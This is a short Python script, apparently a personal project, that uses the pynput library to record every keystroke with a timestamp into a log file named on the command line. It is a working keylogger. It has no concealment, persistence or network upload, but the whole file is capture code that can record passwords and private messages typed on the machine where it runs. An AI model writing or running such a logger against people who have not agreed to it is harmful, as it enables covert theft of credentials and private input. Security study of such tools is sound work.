# -*- coding: utf-8 -*-
"""
Created on Wed Mar 23 05:50:52 2022

@author: kenzi
"""

import argparse
from pynput.keyboard import Listener
import logging


#file = "keys.txt"
parser=argparse.ArgumentParser()
parser.add_argument("file_name", type=str, help="enter the name of the file") 

args=parser.parse_args()
print(args)
file = args.file_name

logging.basicConfig(filename=file, level=logging.DEBUG, format="%(asctime)s | %(message)s")


def on_press(key):
    logging.info(key)
    
with Listener(on_press=on_press) as listener:
    listener.join()
    
